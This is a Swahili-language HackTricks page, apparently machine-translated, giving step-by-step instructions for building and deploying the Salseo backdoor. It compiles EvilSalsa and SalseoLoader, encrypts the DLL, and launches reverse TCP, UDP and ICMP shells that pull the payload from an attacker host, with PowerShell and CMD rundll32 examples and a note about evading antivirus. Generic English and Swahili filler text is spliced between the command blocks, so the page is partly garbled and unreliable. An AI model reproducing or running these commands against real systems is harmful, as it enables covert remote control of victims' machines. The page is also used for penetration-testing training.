# Salseo

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikionekana kwenye HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwenye** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>

## Kukusanya faili za binary

Pakua nambari ya chanzo kutoka kwenye github na kusanya **EvilSalsa** na **SalseoLoader**. Utahitaji kuwa na **Visual Studio** imewekwa ili kusanya nambari.

Kusanya miradi hiyo kwa ajili ya muundo wa kisanduku cha Windows ambapo utazitumia(Ikiwa Windows inasaidia x64, zikusanye kwa muundo huo).

Unaweza **kuchagua muundo** ndani ya Visual Studio kwenye **Tab ya "Build" kushoto** kwenye **"Platform Target".**

(\*\*Ikiwa huwezi kupata chaguo hizi, bonyeza kwenye **"Tab ya Mradi"** na kisha kwenye **"Mali ya \<Jina la Mradi>"**)

![](<../.gitbook/assets/image (132).png>)

Kisha, kusanya miradi yote (Build -> Build Solution) (Ndani ya magogo itaonekana njia ya faili ya kutekelezeka):

![](<../.gitbook/assets/image (1) (2) (1) (1) (1).png>)

## Jitayarisha Backdoor

Kwanza kabisa, utahitaji kuweka msimbo wa **EvilSalsa.dll.** Kufanya hivyo, unaweza kutumia skripti ya python **encrypterassembly.py** au unaweza kusanya mradi wa **EncrypterAssembly**:

### **Python**
```
python EncrypterAssembly/encrypterassembly.py <FILE> <PASSWORD> <OUTPUT_FILE>
python EncrypterAssembly/encrypterassembly.py EvilSalsax.dll password evilsalsa.dll.txt
```
### Windows

#### Salseo

##### Salseo - Backdoor

###### Salseo - Persistence

Salseo is a backdoor technique that allows an attacker to maintain access to a compromised Windows system. It achieves persistence by creating a new service or modifying an existing one to execute malicious code each time the system starts.

###### Salseo - Privilege Escalation

Salseo can also be used to escalate privileges on a compromised Windows system. By exploiting vulnerabilities or misconfigurations, an attacker can gain higher privileges and access sensitive information or perform unauthorized actions.

###### Salseo - Command Execution

With Salseo, an attacker can execute commands on a compromised Windows system. This allows them to control the system remotely, run malicious scripts, or perform other actions to further their objectives.

##### Salseo - Detection and Prevention

Detecting and preventing Salseo attacks is crucial for maintaining the security of a Windows system. Some measures that can be taken include:

- Regularly updating the system and software to patch vulnerabilities.
- Implementing strong access controls and user permissions.
- Monitoring system logs and network traffic for suspicious activity.
- Using antivirus and intrusion detection systems to detect and block malicious code.
- Conducting regular security audits and penetration testing to identify and address vulnerabilities.

By following these practices, system administrators can enhance the security of their Windows systems and reduce the risk of Salseo attacks.
```
EncrypterAssembly.exe <FILE> <PASSWORD> <OUTPUT_FILE>
EncrypterAssembly.exe EvilSalsax.dll password evilsalsa.dll.txt
```
Sasa una kila kitu unachohitaji kutekeleza kitu cha Salseo: **EvilDalsa.dll iliyohifadhiwa** na **binary ya SalseoLoader.**

**Pakia binary ya SalseoLoader.exe kwenye kifaa. Hazipaswi kugunduliwa na AV yoyote...**

## **Tekeleza mlango wa nyuma**

### **Pata kifuniko cha TCP (pakua dll iliyohifadhiwa kupitia HTTP)**

Kumbuka kuanza nc kama msikilizaji wa kifuniko cha nyuma na seva ya HTTP ili kutumikia evilsalsa iliyohifadhiwa.
```
SalseoLoader.exe password http://<Attacker-IP>/evilsalsa.dll.txt reversetcp <Attacker-IP> <Port>
```
### **Kupata kifaa cha kudhibiti cha nyuma cha UDP (kupakua dll iliyohifadhiwa kupitia SMB)**

Kumbuka kuanza nc kama msikilizaji wa kifaa cha kudhibiti cha nyuma, na seva ya SMB ili kutumikia evilsalsa iliyohifadhiwa (impacket-smbserver).
```
SalseoLoader.exe password \\<Attacker-IP>/folder/evilsalsa.dll.txt reverseudp <Attacker-IP> <Port>
```
### **Kupata kifaa cha kurudisha shell ya ICMP (dll iliyosimbwa tayari ndani ya mwathiriwa)**

**Wakati huu unahitaji zana maalum kwenye kifaa cha kupokea shell ya kurudisha. Pakua:** [**https://github.com/inquisb/icmpsh**](https://github.com/inquisb/icmpsh)

#### **Zima Majibu ya ICMP:**
```
sysctl -w net.ipv4.icmp_echo_ignore_all=1

#You finish, you can enable it again running:
sysctl -w net.ipv4.icmp_echo_ignore_all=0
```
#### Tekeleza mteja:
```
python icmpsh_m.py "<Attacker-IP>" "<Victm-IP>"
```
#### Ndani ya mwathiriwa, hebu tutekeleze kitu kinachoitwa salseo:
```
SalseoLoader.exe password C:/Path/to/evilsalsa.dll.txt reverseicmp <Attacker-IP>
```
## Kukusanya SalseoLoader kama DLL inayotangaza kazi kuu

Fungua mradi wa SalseoLoader kwa kutumia Visual Studio.

### Ongeza kabla ya kazi kuu: \[DllExport]

![](<../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

### Sakinisha DllExport kwa mradi huu

#### **Zana** --> **Meneja wa Pakiti za NuGet** --> **Simamia Pakiti za NuGet kwa Suluhisho...**

![](<../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

#### **Tafuta pakiti ya DllExport (kwa kutumia kichupo cha Kupitia), na bonyeza Sakinisha (na ukubali kisanduku cha arifa)**

![](<../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1).png>)

Katika saraka yako ya mradi, faili zifuatazo zimeonekana: **DllExport.bat** na **DllExport\_Configure.bat**

### **Ondoa** DllExport

Bonyeza **Ondoa** (ndiyo, ni ajabu lakini niamini, ni muhimu)

![](<../.gitbook/assets/image (5) (1) (1) (2) (1).png>)

### **Toka** Visual Studio na tekeleza DllExport\_configure

Tu **toka** Visual Studio

Kisha, nenda kwenye **saraka yako ya SalseoLoader** na **tekeleza DllExport\_Configure.bat**

Chagua **x64** (ikiwa utaitumia ndani ya sanduku la x64, hiyo ilikuwa kesi yangu), chagua **System.Runtime.InteropServices** (ndani ya **Namespace for DllExport**) na bonyeza **Tumia**

![](<../.gitbook/assets/image (7) (1) (1) (1) (1).png>)

### **Fungua tena mradi na visual Studio**

**\[DllExport]** haipaswi tena kuwa na alama ya kosa

![](<../.gitbook/assets/image (8) (1).png>)

### Jenga suluhisho

Chagua **Aina ya Matokeo = Maktaba ya Darasa** (Mradi --> Vipengele vya SalseoLoader --> Maombi --> Aina ya Matokeo = Maktaba ya Darasa)

![](<../.gitbook/assets/image (10) (1).png>)

Chagua **jukwaa la x64** (Mradi --> Vipengele vya SalseoLoader --> Jenga --> Lengo la Jukwaa = x64)

![](<../.gitbook/assets/image (9) (1) (1).png>)

Kwa **kujenga** suluhisho: Jenga --> Jenga Suluhisho (Ndani ya konsoli ya Matokeo, njia ya DLL mpya itaonekana)

### Jaribu Dll iliyozalishwa

Nakili na ubandike Dll mahali unapotaka kuitumia.

Tekeleza:
```
rundll32.exe SalseoLoader.dll,main
```
Ikiwa hakuna kosa linaonekana, labda una DLL inayofanya kazi!!

## Pata kifaa cha kudhibiti kwa kutumia DLL

Usisahau kutumia **seva ya HTTP** na kuweka **msikilizaji wa nc**

### Powershell
```
$env:pass="password"
$env:payload="http://10.2.0.5/evilsalsax64.dll.txt"
$env:lhost="10.2.0.5"
$env:lport="1337"
$env:shell="reversetcp"
rundll32.exe SalseoLoader.dll,main
```
### CMD

CMD ni programu ya amri ya Windows ambayo inaruhusu watumiaji kuingiliana na mfumo wa uendeshaji kwa kutumia amri za maandishi. Inaweza kutumika kufanya shughuli mbalimbali za usimamizi na udhibiti wa mfumo, kama vile kuendesha programu, kusimamia faili na folda, na kusanidi mipangilio ya mfumo.

Kutumia CMD, unaweza kufanya mambo kama vile kuunda, kufuta, na kuhamisha faili na folda, kuangalia na kusasisha mipangilio ya mtandao, kusimamia michakato ya mfumo, na kufanya shughuli nyingine za usimamizi wa mfumo.

CMD pia inaweza kutumika kama chombo cha kufanya shughuli za udukuzi na uchunguzi wa mfumo. Kwa mfano, unaweza kutumia CMD kuunda backdoor, kufanya uchunguzi wa mtandao, na kufanya majaribio ya usalama kwenye mfumo wako au mfumo wa mtu mwingine.

Kujifunza zaidi juu ya amri na mbinu za CMD, unaweza kutafuta habari zaidi mkondoni au kusoma vitabu vya kujifunzia hacking.
```
set pass=password
set payload=http://10.2.0.5/evilsalsax64.dll.txt
set lhost=10.2.0.5
set lport=1337
set shell=reversetcp
rundll32.exe SalseoLoader.dll,main
```
<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikionekana katika HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwenye** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>
